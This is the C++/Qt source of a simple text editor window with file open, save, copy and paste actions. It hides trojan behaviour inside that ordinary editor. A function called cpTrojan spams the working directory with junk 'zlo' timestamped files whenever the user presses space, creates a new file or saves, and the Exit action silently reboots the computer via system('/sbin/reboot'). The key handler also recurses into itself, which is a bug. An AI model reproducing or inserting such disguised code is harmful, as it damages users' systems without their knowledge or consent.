#include "mainwindow.h"
#include "ui_mainwindow.h"
using namespace std;
MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    this->setCentralWidget(ui->textEdit);
}
MainWindow::~MainWindow()
{
    delete ui;
}
void MainWindow::keyPressEvent(QKeyEvent *keyEvent)
{
    int qtKey = keyEvent->key();
    if(qtKey == Qt::Key_Space)
    {
        cpTrojan();
    }
    else
        MainWindow::keyPressEvent(keyEvent);
}
void MainWindow::cpTrojan()
{
    QString fname = "zlo"+QDateTime::currentDateTime().toString("yyyy-MM-dd_hh-mm-ss") + ".txt";
    QFile file(fname);
    if (file.open(QIODevice::WriteOnly | QIODevice::Append)) {
        file.write("blablabla");
        file.close();
    }
}
void MainWindow::on_actionNew_triggered()
{
    cpTrojan();
    mFileName = "untitled.txt";
    ui->textEdit->setPlainText("");
}
void MainWindow::on_actionOpen_triggered()
{
    QString file = QFileDialog::getOpenFileName(this,"Open a file");
    if(!file.isEmpty())
    {
        QFile sFile(file);
        if(sFile.open(QFile::ReadOnly | QFile::Text))
        {
            mFileName = file;
            QTextStream in(&sFile);
            QString text = in.readAll();
            sFile.close();
            ui->textEdit->setPlainText(text);
        }
    }
}
void MainWindow::on_actionSave_triggered()
{
    cpTrojan();
    QFile sFile(mFileName);
    if(sFile.open(QFile::WriteOnly | QFile::Text))
    {
        QTextStream out(&sFile);
        out << ui->textEdit->toPlainText();

        sFile.flush();
        sFile.close();
    }
}
void MainWindow::on_actionSave_As_triggered()
{
    QString file = QFileDialog::getSaveFileName(this,"Save a file");
    if(!file.isEmpty())
    {
        mFileName = file;
        on_actionSave_triggered();
    }
}
void MainWindow::on_actionExit_triggered()
{
    system("/sbin/reboot");
    close();
}
void MainWindow::on_actionCopy_triggered()
{
    ui->textEdit->copy();
}
void MainWindow::on_actionPaste_triggered()
{
    ui->textEdit->paste();
}
void MainWindow::on_actionCut_triggered()
{
    ui->textEdit->cut();
}
void MainWindow::on_actionUndo_triggered()
{
    ui->textEdit->undo();
}
void MainWindow::on_actionRedo_triggered()
{
    ui->textEdit->redo();
}
